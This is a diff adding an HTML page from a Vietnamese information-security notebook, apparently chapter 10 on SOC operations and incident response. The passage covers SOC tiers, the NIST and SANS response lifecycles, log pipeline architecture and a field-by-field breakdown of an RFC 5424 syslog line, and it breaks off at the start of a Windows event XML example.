@@ -1,0 +1,1460 @@
+<!doctype html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Chương 10 — Vận hành SOC &amp;amp; Ứng phó sự cố — Sổ tay An toàn thông tin</title>
+<meta name="description" content="Blog chia sẻ kiến thức an toàn thông tin — ghi chép trong quá trình học và làm việc.">
+<meta property="og:title" content="Chương 10 — Vận hành SOC &amp;amp; Ứng phó sự cố — Sổ tay An toàn thông tin">
+<meta property="og:description" content="Blog chia sẻ kiến thức an toàn thông tin — ghi chép trong quá trình học và làm việc.">
+<meta property="og:type" content="article">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📓</text></svg>">
+<link rel="prev" href="ch09.html"><link rel="next" href="ch11.html">
+<script>(function(){var t=localStorage.getItem('kb-theme');if(t&&t!=='light')document.documentElement.setAttribute('data-theme',t);})();</script>
+<style>:root{--wibu-bg:url("assets/wibu-bg.jpg")}</style>
+<style>
+:root{
+  --bg:#f4efe3; --panel:#ebe3d1; --panel2:#e1d7c0; --ink:#2b2620; --muted:#79705e;
+  --line:#d6cbb3; --accent:#0f6e60; --accent2:#b1502c; --code-bg:#241f18; --code-ink:#ece3d1;
+  --tbl-head:#e6dcc5; --tbl-zebra:#efe8d6; --kbd:#e6dcc5; --codeborder:#3a3228; --scroll:#cabda2;
+  --serif:Georgia,"Iowan Old Style","Times New Roman",serif;
+}
+html[data-theme="dark"]{
+  --bg:#16140f; --panel:#1e1b15; --panel2:#2a261d; --ink:#e9e2d2; --muted:#9c917c;
+  --line:#322d23; --accent:#46b3a3; --accent2:#e0824f; --code-bg:#0e0c08; --code-ink:#e9e2d2;
+  --tbl-head:#2a261d; --tbl-zebra:#1c1914; --kbd:#2c271e; --codeborder:#322d23; --scroll:#3a3328;
+}
+html[data-theme="wibu"]{
+  --bg:#241a38; --panel:rgba(38,28,55,.74); --panel2:rgba(60,44,86,.72); --ink:#f4ecff; --muted:#cbb9e6;
+  --line:rgba(255,255,255,.15); --accent:#ff79b0; --accent2:#a78bff; --code-bg:rgba(15,10,25,.85); --code-ink:#f0e8ff;
+  --tbl-head:rgba(60,44,86,.72); --tbl-zebra:rgba(48,35,70,.45); --kbd:rgba(70,52,98,.7); --codeborder:rgba(255,255,255,.13); --scroll:#7a5fae;
+}
+html[data-theme="wibu"] body{
+  background-color:#241a38;
+  background-image:var(--wibu-bg, none), linear-gradient(135deg,#2a1e44 0%,#46315f 55%,#5a3f74 100%);
+  background-size:cover; background-position:center; background-attachment:fixed;
+}
+html[data-theme="wibu"] .sidebar,
+html[data-theme="wibu"] .brand,
+html[data-theme="wibu"] .search,
+html[data-theme="wibu"] .topbar{backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px)}
+html[data-theme="wibu"] .main{background:rgba(18,12,30,.55);border:1px solid var(--line);border-radius:16px;
+  margin-top:20px;margin-bottom:20px;backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px)}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font:16px/1.72 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif;}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+
+.wrap{display:flex;min-height:100vh}
+.sidebar{width:322px;flex:0 0 322px;background:var(--panel);border-right:1px solid var(--line);
+  height:100vh;position:sticky;top:0;overflow-y:auto;padding:0}
+.brand{padding:20px 18px 13px;border-bottom:1px solid var(--line);position:sticky;top:0;background:var(--panel);z-index:2}
+.brand h1{font-family:var(--serif);font-size:19px;margin:0 0 3px;letter-spacing:.2px;color:var(--ink)}
+.brand .tag{margin:3px 0 0;font-size:11.5px;color:var(--muted);line-height:1.45}
+.brand .author{display:block;margin-top:7px;font-size:11.5px;color:var(--accent2);font-weight:600}
+.controls{display:flex;gap:7px;margin-top:11px}
+.ctrl-btn{display:inline-flex;align-items:center;justify-content:center;gap:5px;background:var(--bg);
+  border:1px solid var(--line);color:var(--ink);border-radius:7px;padding:5px 10px;font-size:12px;
+  cursor:pointer;font-family:inherit;line-height:1;text-decoration:none}
+.ctrl-btn:hover{border-color:var(--accent);text-decoration:none}
+.search{padding:10px 14px;position:sticky;top:118px;background:var(--panel);z-index:2;border-bottom:1px solid var(--line)}
+.search input{width:100%;background:var(--bg);border:1px solid var(--line);color:var(--ink);
+  border-radius:7px;padding:8px 10px;font-size:13px;outline:none}
+.search input:focus{border-color:var(--accent)}
+.nav{padding:8px 8px 40px}
+.nav-group{padding:16px 10px 5px;font-family:var(--serif);font-size:11px;font-weight:700;letter-spacing:.4px;
+  text-transform:uppercase;color:var(--accent2)}
+.nav-chapter{margin:1px 0}
+.nav-ch-title{display:flex;gap:9px;align-items:baseline;padding:7px 10px;border-radius:7px;color:var(--ink);font-size:13.5px}
+.nav-ch-title .num{font-family:var(--serif);font-size:11px;color:var(--muted);font-variant-numeric:tabular-nums;min-width:18px}
+.nav-ch-title:hover{background:var(--panel2);text-decoration:none}
+.nav-chapter.active>.nav-ch-title{background:var(--bg);box-shadow:inset 3px 0 0 var(--accent);color:var(--ink);font-weight:700}
+.nav-chapter.active>.nav-ch-title .num{color:var(--accent)}
+.nav-subs{display:none;margin:2px 0 6px 27px;border-left:1px solid var(--line);padding-left:9px}
+.nav-chapter.open .nav-subs{display:block}
+.nav-sub{display:block;padding:4px 8px;font-size:12px;color:var(--muted);border-radius:6px;line-height:1.4}
+.nav-sub:hover{color:var(--accent);background:var(--panel2);text-decoration:none}
+
+.content{flex:1;min-width:0;padding:0 0 120px}
+.topbar{display:none}
+.main{max-width:820px;margin:0 auto;padding:40px 44px}
+.chapter{border-bottom:1px solid var(--line);padding-bottom:44px;margin-bottom:14px}
+.chapter h1{font-family:var(--serif);font-size:31px;line-height:1.22;margin:40px 0 20px;padding-bottom:12px;
+  border-bottom:2px solid var(--accent);color:var(--ink);scroll-margin-top:16px}
+.chapter:first-child h1{margin-top:8px}
+h2{font-family:var(--serif);font-size:23px;margin:36px 0 12px;color:var(--ink);scroll-margin-top:16px}
+h3{font-family:var(--serif);font-size:18px;margin:24px 0 8px;color:var(--ink);scroll-margin-top:16px}
+h4{font-size:14px;margin:18px 0 6px;color:var(--accent);font-weight:700}
+p{margin:11px 0}
+ul,ol{margin:11px 0;padding-left:24px}
+li{margin:5px 0}
+strong{color:var(--ink);font-weight:700}
+hr{border:0;border-top:1px solid var(--line);margin:28px 0}
+blockquote{margin:15px 0;padding:9px 16px;border-left:3px solid var(--accent2);
+  background:var(--panel);border-radius:0 7px 7px 0;color:var(--muted)}
+
+code{font-family:"SF Mono","JetBrains Mono",Consolas,"Liberation Mono",monospace;font-size:13px}
+:not(pre)>code{background:var(--kbd);color:var(--accent2);padding:1.5px 6px;border-radius:5px;font-size:12.5px}
+pre{background:var(--code-bg);border:1px solid var(--codeborder);border-radius:9px;padding:14px 16px;
+  overflow-x:auto;margin:15px 0;line-height:1.55}
+pre code{color:var(--code-ink);background:none;padding:0;font-size:12.7px;white-space:pre}
+
+.tbl-scroll,table{width:100%}
+table{border-collapse:collapse;margin:16px 0;font-size:13.5px;display:block;overflow-x:auto}
+th,td{border:1px solid var(--line);padding:8px 11px;text-align:left;vertical-align:top}
+th{background:var(--tbl-head);color:var(--ink);font-weight:700;white-space:nowrap}
+tbody tr:nth-child(even){background:var(--tbl-zebra)}
+
+.menu-btn{display:none}
+@media(max-width:980px){
+  .sidebar{position:fixed;left:0;top:0;z-index:50;transform:translateX(-100%);transition:transform .25s}
+  .sidebar.show{transform:none;box-shadow:0 0 40px rgba(20,15,8,.45)}
+  .topbar{display:flex;align-items:center;gap:10px;position:sticky;top:0;z-index:40;
+    background:var(--panel);border-bottom:1px solid var(--line);padding:10px 16px}
+  .menu-btn{display:inline-flex;background:var(--bg);border:1px solid var(--line);color:var(--ink);
+    border-radius:7px;padding:7px 12px;font-size:14px;cursor:pointer}
+  .topbar .ttl{font-family:var(--serif);font-size:15px;font-weight:700;flex:1}
+  .main{padding:24px 18px}
+  .chapter h1{font-size:25px}
+}
+::-webkit-scrollbar{width:11px;height:11px}
+::-webkit-scrollbar-thumb{background:var(--scroll);border-radius:6px;border:2px solid var(--bg)}
+::-webkit-scrollbar-track{background:transparent}
+
+.site-foot{max-width:820px;margin:54px auto 0;padding:24px 44px 0;border-top:1px solid var(--line);
+  color:var(--muted);font-size:13px;line-height:1.7}
+.site-foot a{color:var(--accent)}
+.site-foot .name{color:var(--ink);font-weight:700}
+@media(max-width:980px){.site-foot{padding:24px 18px 0}}
+.brand h1 a{color:var(--ink);text-decoration:none}
+.brand h1 a:hover{color:var(--accent)}
+.nav-sub.here{color:var(--accent);background:var(--panel2);font-weight:600}
+.pager{max-width:820px;margin:34px auto 0;display:flex;gap:14px;justify-content:space-between}
+.pg{flex:1 1 0;min-width:0;display:block;padding:13px 16px;border:1px solid var(--line);border-radius:10px;
+  background:var(--panel);color:var(--ink);text-decoration:none}
+a.pg:hover{border-color:var(--accent);text-decoration:none}
+a.pg:hover b{color:var(--accent)}
+.pg span{display:block;font-size:11.5px;color:var(--muted);margin-bottom:3px}
+.pg b{display:block;font-size:13.5px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.pg.next{text-align:right}
+span.pg{border:0;background:none}
+@media(max-width:980px){.pager{padding:0 18px}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <aside class="sidebar" id="sidebar">
+    <div class="brand"><h1><a href="notes.html">Sổ tay An toàn thông tin</a></h1>
+      <p class="tag">Chia sẻ kiến thức · ghi chép khi học &amp; làm</p>
+      <span class="author">✍️ Fee</span>
+      <div class="controls"><a class="ctrl-btn" href="./">🏠 Trang chủ</a><button class="ctrl-btn themeBtn" title="Sáng / Tối / Wibu">🌙</button><a class="ctrl-btn themeLink" href="en/notes.html">🌐 EN</a></div></div>
+    <div class="search"><input id="q" type="search" placeholder="Lọc mục lục…" autocomplete="off"></div>
+    <nav class="nav"><div class="nav-chapter" data-ch="00"><a class="nav-ch-title" href="notes.html"><span class="num">00</span><span class="t">Giới thiệu &amp; Mục lục</span></a><div class="nav-subs"></div></div><div class="nav-group">Phần A · Nền tảng</div><div class="nav-chapter" data-ch="01"><a class="nav-ch-title" href="ch01.html"><span class="num">01</span><span class="t">Mạng máy tính</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="02"><a class="nav-ch-title" href="ch02.html"><span class="num">02</span><span class="t">Hệ điều hành Linux</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="03"><a class="nav-ch-title" href="ch03.html"><span class="num">03</span><span class="t">Windows &amp; Active Directory</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="04"><a class="nav-ch-title" href="ch04.html"><span class="num">04</span><span class="t">Mật mã &amp; Nền tảng bảo mật</span></a><div class="nav-subs"></div></div><div class="nav-group">Phần B · An ninh ứng dụng &amp; DevSecOps</div><div class="nav-chapter" data-ch="05"><a class="nav-ch-title" href="ch05.html"><span class="num">05</span><span class="t">An ninh ứng dụng Web (OWASP)</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="06"><a class="nav-ch-title" href="ch06.html"><span class="num">06</span><span class="t">DevSecOps &amp; Quét mã nguồn</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="07"><a class="nav-ch-title" href="ch07.html"><span class="num">07</span><span class="t">CI/CD &amp; GitOps</span></a><div class="nav-subs"></div></div><div class="nav-group">Phần C · Giám sát, Phát hiện &amp; Ứng phó</div><div class="nav-chapter" data-ch="08"><a class="nav-ch-title" href="ch08.html"><span class="num">08</span><span class="t">SIEM &amp; Quản lý log</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="09"><a class="nav-ch-title" href="ch09.html"><span class="num">09</span><span class="t">Observability &amp; Giám sát hạ tầng</span></a><div class="nav-subs"></div></div><div class="nav-chapter open active" data-ch="10"><a class="nav-ch-title" href="#top"><span class="num">10</span><span class="t">Vận hành SOC &amp; Ứng phó sự cố</span></a><div class="nav-subs"><a class="nav-sub" href="#ch10-tong-quan">Tổng quan</a><a class="nav-sub" href="#ch10-101-tong-quan-kien-truc-soc-va-luong-du-lieu">10.1. Tổng quan kiến trúc SOC và luồng dữ liệu</a><a class="nav-sub" href="#ch10-102-đinh-dang-log-o-muc-bytefield-nen-tang-phai-nam">10.2. Định dạng log ở mức byte/field — nền tảng phải nắm</a><a class="nav-sub" href="#ch10-103-cau-truc-soc-theo-tier-nhiem-vu-chinh-xac-tung-cap">10.3. Cấu trúc SOC theo tier — nhiệm vụ chính xác từng cấp</a><a class="nav-sub" href="#ch10-104-quy-trinh-triage-alert-tung-buoc">10.4. Quy trình triage alert — từng bước</a><a class="nav-sub" href="#ch10-105-vong-đoi-ung-pho-su-co-nist-sp-800-61-va-sans-picerl">10.5. Vòng đời ứng phó sự cố — NIST SP 800-61 và SANS PICERL</a><a class="nav-sub" href="#ch10-106-playbook-runbook-mau">10.6. Playbook / Runbook mẫu</a><a class="nav-sub" href="#ch10-107-chi-so-đo-luong-mttd-mttr">10.7. Chỉ số đo lường — MTTD, MTTR</a><a class="nav-sub" href="#ch10-108-cong-cu-thuc-hanh-vi-du-chay-đuoc">10.8. Công cụ thực hành — ví dụ chạy được</a><a class="nav-sub" href="#ch10-109-threat-hunting-gia-thuyet-dua-tren-mitre-attck">10.9. Threat Hunting — giả thuyết dựa trên MITRE ATT&amp;amp;CK</a><a class="nav-sub" href="#ch10-1010-tinh-huong-mau-phan-tich-tu-đau-đen-cuoi">10.10. Tình huống mẫu — phân tích từ đầu đến cuối</a><a class="nav-sub" href="#ch10-1011-chain-of-custody-forensics-co-ban">10.11. Chain of Custody &amp;amp; Forensics cơ bản</a><a class="nav-sub" href="#ch10-1012-log-retention-chinh-sach-luu-tru-va-ly-do">10.12. Log Retention — chính sách lưu trữ và lý do</a><a class="nav-sub" href="#ch10-1013-tong-ket-ket-noi-cac-manh">10.13. Tổng kết kết nối các mảnh</a><a class="nav-sub" href="#ch10-ghi-chu-cua-minh">Ghi chú của mình</a></div></div><div class="nav-group">Phần D · Phòng thủ mạng &amp; Kiểm thử</div><div class="nav-chapter" data-ch="11"><a class="nav-ch-title" href="ch11.html"><span class="num">11</span><span class="t">Phòng thủ mạng (IDS/WAF/VPN)</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="12"><a class="nav-ch-title" href="ch12.html"><span class="num">12</span><span class="t">Kiểm thử &amp; Đánh giá lỗ hổng</span></a><div class="nav-subs"></div></div><div class="nav-group">Phần E · Hạ tầng, Ảo hóa &amp; Đám mây</div><div class="nav-chapter" data-ch="13"><a class="nav-ch-title" href="ch13.html"><span class="num">13</span><span class="t">Bảo mật Đám mây</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="14"><a class="nav-ch-title" href="ch14.html"><span class="num">14</span><span class="t">Ảo hóa &amp; Container</span></a><div class="nav-subs"></div></div><div class="nav-group">Phần F · Tấn công, Tuân thủ &amp; Tự động hóa</div><div class="nav-chapter" data-ch="15"><a class="nav-ch-title" href="ch15.html"><span class="num">15</span><span class="t">Threat Intel &amp; Khung tấn công</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="16"><a class="nav-ch-title" href="ch16.html"><span class="num">16</span><span class="t">Tuân thủ &amp; Quản trị (GRC)</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="17"><a class="nav-ch-title" href="ch17.html"><span class="num">17</span><span class="t">Lập trình &amp; Tự động hóa</span></a><div class="nav-subs"></div></div><div class="nav-group">Phụ lục</div><div class="nav-chapter" data-ch="99"><a class="nav-ch-title" href="ch99.html"><span class="num">99</span><span class="t">Thuật ngữ &amp; viết tắt</span></a><div class="nav-subs"></div></div></nav>
+  </aside>
+  <div class="content">
+    <div class="topbar"><button class="menu-btn" id="menu">☰</button><span class="ttl">Sổ tay An toàn thông tin</span>
+      <button class="ctrl-btn themeBtn" title="Sáng / Tối / Wibu">🌙</button><a class="ctrl-btn themeLink" href="en/notes.html">🌐 EN</a></div>
+    <main class="main" id="top">
+      <section class="chapter" id="sec-10" data-ch="10">
+<h1 id="ch10-chuong-10-van-hanh-soc-ung-pho-su-co">Chương 10 — Vận hành SOC &amp; Ứng phó sự cố</h1>
+<h2 id="ch10-tong-quan">Tổng quan</h2>
+<p>Thứ gây choáng trong những ca trực đầu tiên không phải là bị tấn công, mà là số lượng alert dội về mỗi ngày — hàng nghìn cảnh báo, tuyệt đại đa số vô hại, và ai đó phải quyết định trong vài giây cái nào đáng lo. Chương này ghi lại những gì mình học được về cách một <strong>SOC</strong> (Security Operations Center — đội con người, quy trình và công nghệ trực 24/7) tổ chức việc lọc tín hiệu ra khỏi nhiễu đó một cách có hệ thống, thay vì dựa cảm tính từng người.</p>
+<p>Mọi thứ bắt đầu từ <strong>log</strong> — bản ghi sự kiện mà mỗi máy chủ, thiết bị, ứng dụng tự sinh ra, nhưng mỗi nền tảng lại dùng một định dạng riêng (Syslog trên Linux, Event Log trên Windows, CEF trên thiết bị bảo mật), nên phải chuẩn hoá về chung một schema mới phân tích được. SOC không xử lý dàn trải: việc chia theo <strong>Tier 1/2/3</strong> — từ triage nhanh true/false positive ở tuyến đầu, tới điều tra sâu và threat hunting chủ động ở Tier 3 — là cách tránh để chuyên gia đắt tiền ngồi làm việc đơn giản, còn việc khó thì dồn cho người đủ năng lực. Và <strong>triage</strong> tự nó là một quy trình cần chuẩn hoá, vì không thể đối xử mọi cảnh báo như nhau mà không bỏ sót thứ nguỵ trang dưới vẻ bình thường.</p>
+<p>Khi sự cố thật sự xảy ra, thao tác tuỳ tiện — kiểu tắt máy ngay lúc thấy dấu hiệu lạ — có thể phá huỷ bằng chứng và làm nó lan rộng. Đây là lý do có hai khung xử lý chuẩn gần như tương đương nhau, <strong>NIST SP 800-61</strong> (4 pha: Preparation → Detection &amp; Analysis → Containment, Eradication &amp; Recovery → Post-Incident Activity) và <strong>SANS PICERL</strong> (6 bước, tách riêng Containment/Eradication/Recovery), cùng ép một trình tự: cô lập trước, bảo toàn bằng chứng, rồi mới loại bỏ và khôi phục. <strong>Playbook</strong> vạch quy trình cấp cao cho từng loại sự cố; <strong>runbook</strong> cụ thể hoá thành từng lệnh, từng truy vấn để analyst ít kinh nghiệm cũng làm đúng giữa lúc khẩn cấp. Còn <strong>MTTD</strong> và <strong>MTTR</strong> là hai con số đo lại cả bộ máy này nhanh tới đâu — thời gian kẻ tấn công tồn tại trong mạng (dwell time) càng dài, thiệt hại càng lớn, nên rút ngắn hai chỉ số này là rút ngắn thiệt hại.</p>
+<p>Phần còn lại của chương đi vào công cụ và kỹ thuật cụ thể, vì con người không thể xử lý thủ công hàng tỷ log hay từng gói tin — các nền tảng phát hiện và điều tra (<strong>SIEM</strong> gom log tập trung để truy vấn và sinh alert; <strong>Sigma</strong> viết detection rule một lần dịch được sang nhiều SIEM; <strong>Suricata</strong> phân tích gói tin theo signature; <strong>YARA</strong> nhận diện mã độc theo pattern trong file; <strong>Splunk/SPL</strong>, <strong>osquery/Velociraptor</strong> truy vấn trạng thái endpoint; <strong>TheHive/SOAR</strong> tự động hoá các bước lặp lại) mở rộng năng lực đó ở quy mô lớn. <strong>Threat hunting</strong> đi xa hơn phát hiện tự động: chủ động săn dấu vết kẻ tấn công từ một giả thuyết, dựa trên khung <strong>MITRE ATT&amp;CK</strong> phân loại kỹ thuật tấn công — vì kẻ tấn công tinh vi biết né rule có sẵn. Trong forensics, nguyên tắc <strong>chain of custody</strong> ghi rõ ai giữ bằng chứng khi nào để đảm bảo tính pháp lý, còn dữ liệu dễ bay hơi như RAM phải thu thập theo <strong>order of volatility</strong> trước khi nó mất lúc tắt máy — lý do nhiều playbook yêu cầu cô lập mạng nhưng giữ máy chạy. Và vì kẻ tấn công có thể ẩn mình hàng tháng trước khi lộ diện, chính sách <strong>log retention</strong> (thường phân tầng hot/warm/cold) quyết định điều tra có còn dấu vết để lần lại hay không.</p>
+<blockquote>
+<p>Mỗi mục dưới đây đi theo trục là gì → cơ chế bên trong → ví dụ thực tế → lưu ý bảo mật; con số nào chưa chắc chắn sẽ được đánh dấu "cần kiểm chứng".</p>
+</blockquote>
+<hr />
+<h2 id="ch10-101-tong-quan-kien-truc-soc-va-luong-du-lieu">10.1. Tổng quan kiến trúc SOC và luồng dữ liệu</h2>
+<h3 id="ch10-1011-soc-la-gi-va-vi-sao-ton-tai">10.1.1. SOC là gì và vì sao tồn tại</h3>
+<p><strong>SOC (Security Operations Center)</strong> là đơn vị (con người + quy trình + công nghệ) chịu trách nhiệm giám sát liên tục (thường 24/7), phát hiện, phân tích và ứng phó với các sự kiện an ninh trên toàn bộ hạ tầng số của tổ chức. Lý do tồn tại: phòng thủ là một bài toán <strong>phát hiện sớm trong biển dữ liệu nhiễu</strong>. Một doanh nghiệp cỡ trung bình có thể sinh ra hàng tỷ event log mỗi ngày; chỉ một phần rất nhỏ trong đó là dấu hiệu tấn công thật. SOC là cơ chế tổ chức để lọc tín hiệu (signal) ra khỏi nhiễu (noise) một cách có hệ thống, lặp lại được, và đo lường được.</p>
+<h3 id="ch10-1012-luong-du-lieu-end-to-end-trong-soc">10.1.2. Luồng dữ liệu end-to-end trong SOC</h3>
+<p>Để hiểu mọi thứ phía sau, cần nắm chính xác dữ liệu đi qua đâu, biến đổi thế nào:</p>
+<pre><code>[Nguồn log]            [Vận chuyển]          [Chuẩn hoá/Lưu trữ]      [Phát hiện]        [Con người]
+ Endpoint (EDR) ──┐
+ Firewall/IDS  ───┤   syslog/UDP 514
+ Web server    ───┼──&gt; TCP 6514 (TLS) ──&gt; Collector ──&gt; Parser/Normalize ──&gt; SIEM ──&gt; Alert ──&gt; Analyst
+ Cloud (CT logs)──┤   Beats/Agent             (Logstash,    (ECS, CIM)       (rule,    (Tier 1/2/3)
+ AD/Auth       ───┘   Kafka                    Vector)                        ML, corr)
+</code></pre>
+<p><strong>Giải thích từng chặng:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Chặng</th>
+<th>Vai trò</th>
+<th>Định dạng dữ liệu điển hình</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Nguồn log</td>
+<td>Sinh sự kiện thô</td>
+<td>Windows Event (EVTX/XML), Syslog (RFC 5424), JSON, CEF, LEEF</td>
+</tr>
+<tr>
+<td>Vận chuyển</td>
+<td>Đưa log từ nguồn về tập trung</td>
+<td>Syslog over UDP/TCP/TLS, Filebeat/Fluentd, Kafka topic</td>
+</tr>
+<tr>
+<td>Chuẩn hoá</td>
+<td>Đưa về schema chung để truy vấn</td>
+<td>ECS (Elastic Common Schema), Splunk CIM, OCSF</td>
+</tr>
+<tr>
+<td>SIEM</td>
+<td>Lưu, đánh chỉ mục, chạy rule tương quan</td>
+<td>Inverted index, time-series store</td>
+</tr>
+<tr>
+<td>Phát hiện</td>
+<td>Sinh alert từ rule/ML/correlation</td>
+<td>Sigma rule, EQL, SPL, KQL</td>
+</tr>
+<tr>
+<td>Con người</td>
+<td>Triage, điều tra, ứng phó</td>
+<td>Ticket, playbook, case</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Vì sao thiết kế phân tầng như vậy:</strong> tách rời nguồn — vận chuyển — lưu trữ — phát hiện cho phép thay thế từng thành phần độc lập (đổi SIEM mà không phải cấu hình lại mọi endpoint), chịu tải bằng buffer (Kafka hấp thụ burst), và áp dụng bảo mật riêng cho từng chặng (mã hoá đường truyền, kiểm soát truy cập kho log).</p>
+<hr />
+<h2 id="ch10-102-đinh-dang-log-o-muc-bytefield-nen-tang-phai-nam">10.2. Định dạng log ở mức byte/field — nền tảng phải nắm</h2>
+<p>Phân tích SOC bắt đầu từ việc đọc đúng từng trường log. Dưới đây là các định dạng cốt lõi mổ xẻ tới mức trường.</p>
+<h3 id="ch10-1021-syslog-rfc-5424-mo-xe-tung-truong">10.2.1. Syslog RFC 5424 — mổ xẻ từng trường</h3>
+<p>RFC 5424 (2009) định nghĩa định dạng syslog hiện đại, thay cho RFC 3164 (BSD syslog cũ). Một message syslog RFC 5424 có cấu trúc:</p>
+<pre><code>&lt;PRI&gt;VERSION SP TIMESTAMP SP HOSTNAME SP APP-NAME SP PROCID SP MSGID SP STRUCTURED-DATA SP MSG
+</code></pre>
+<p>Ví dụ thực tế một dòng:</p>
+<pre><code>&lt;34&gt;1 2026-06-19T08:21:09.003Z auth-srv-01 sshd 4821 ID47 [exampleSDID@32473 iut=&quot;3&quot;] Failed password for invalid user admin from 203.0.113.45 port 51022 ssh2
+</code></pre>
+<p>Bảng mổ xẻ từng trường:</p>
+<table>
+<thead>
+<tr>
+<th>Trường</th>
+<th>Kích thước</th>
+<th>Ý nghĩa</th>
+<th>Ví dụ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PRI</td>
+<td>3–5 ký tự, gồm <code>&lt;</code> <code>&gt;</code></td>
+<td>Priority = Facility×8 + Severity</td>
+<td><code>&lt;34&gt;</code></td>
+</tr>
+<tr>
+<td>VERSION</td>
+<td>1–2 ký tự (số)</td>
+<td>Phiên bản format, luôn <code>1</code> cho RFC 5424</td>
+<td><code>1</code></td>
+</tr>
+<tr>
+<td>TIMESTAMP</td>
+<td>tối đa 32 ký tự, RFC 3339</td>
+<td>Thời điểm sinh sự kiện, có múi giờ</td>
+<td><code>2026-06-19T08:21:09.003Z</code></td>
+</tr>
+<tr>
+<td>HOSTNAME</td>
+<td>≤ 255 ký tự</td>
+<td>Tên/IP máy sinh log</td>
+<td><code>auth-srv-01</code></td>
+</tr>
+<tr>
+<td>APP-NAME</td>
+<td>≤ 48 ký tự</td>
+<td>Tên ứng dụng</td>
+<td><code>sshd</code></td>
+</tr>
+<tr>
+<td>PROCID</td>
+<td>≤ 128 ký tự</td>
+<td>PID hoặc id tiến trình</td>
+<td><code>4821</code></td>
+</tr>
+<tr>
+<td>MSGID</td>
+<td>≤ 32 ký tự</td>
+<td>Loại message</td>
+<td><code>ID47</code></td>
+</tr>
+<tr>
+<td>STRUCTURED-DATA</td>
+<td>thay đổi</td>
+<td>Cặp key=value có cấu trúc, <code>[SDID param="val"]</code> hoặc <code>-</code> nếu rỗng</td>
+<td><code>[exampleSDID@32473 iut="3"]</code></td>
+</tr>
+<tr>
+<td>MSG</td>
+<td>còn lại</td>
+<td>Nội dung tự do (UTF-8, có thể bắt đầu bằng BOM EF BB BF)</td>
+<td><code>Failed password ...</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Giải mã trường PRI <code>&lt;34&gt;</code></strong> — đây là chỗ hay bị hiểu sai:</p>
+<p>PRI là một số nguyên = <code>Facility * 8 + Severity</code>.</p>
+<pre><code>34 / 8 = 4  (phần nguyên) -&gt; Facility = 4  (security/authorization messages)
+34 % 8 = 2                -&gt; Severity = 2  (Critical)
+</code></pre>
+<p>Bảng Severity (RFC 5424 §6.2.1):</p>
+<table>
+<thead>
+<tr>
+<th>Giá trị</th>
+<th>Tên</th>
+<th>Ý nghĩa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>Emergency</td>
+<td>Hệ thống không dùng được</td>
+</tr>
+<tr>
+<td>1</td>
+<td>Alert</td>
+<td>Phải hành động ngay</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Critical</td>
+<td>Tình trạng nguy kịch</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Error</td>
+<td>Lỗi</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Warning</td>
+<td>Cảnh báo</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Notice</td>
+<td>Bình thường nhưng đáng chú ý</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Informational</td>
+<td>Thông tin</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Debug</td>
+<td>Gỡ lỗi</td>
+</tr>
+</tbody>
+</table>
+<p>Bảng Facility (một số giá trị quan trọng): 0=kernel, 1=user, 2=mail, 3=daemon, 4=auth/security, 10=authpriv, 16–23=local0–local7.</p>
+<p><strong>Vì sao ghép Facility và Severity vào 1 byte:</strong> thiết kế từ thời băng thông hẹp, gói tin nhỏ; một số nguyên duy nhất cho phép router/collector lọc nhanh (ví dụ "chỉ chuyển tiếp message severity ≤ 3") mà không cần parse toàn bộ.</p>
+<p><strong>Lưu ý bảo mật:</strong> UDP 514 không có xác thực, không mã hoá, không đảm bảo thứ tự/đến nơi. Kẻ tấn công có thể <strong>spoof</strong> log (giả mạo nguồn) để gây nhiễu hoặc xoá dấu vết bằng cách bơm log giả. Production phải dùng <strong>syslog over TLS (RFC 5425, TCP 6514)</strong> với chứng chỉ hai chiều.</p>
+<h3 id="ch10-1022-windows-event-log-evtx-va-cac-truong-an-ninh-quan-trong">10.2.2. Windows Event Log (EVTX) và các trường an ninh quan trọng</h3>
+<p>Windows ghi event dưới dạng nhị phân EVTX nhưng truy vấn ở dạng XML. Mỗi event có cấu trúc:</p>
+<pre><code class="language-xml">&lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
+  &lt;System&gt;
+    &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-...}&quot;/&gt;
+    &lt;EventID&gt;4625&lt;/EventID&gt;
+    &lt;Version&gt;0&lt;/Version&gt;
+    &lt;Level&gt;0&lt;/Level&gt;
+    &lt;Task&gt;12544&lt;/Task&gt;
+    &lt;Opcode&gt;0&lt;/Opcode&gt;
+    &lt;Keywords&gt;0x8010000000000000&lt;/Keywords&gt;
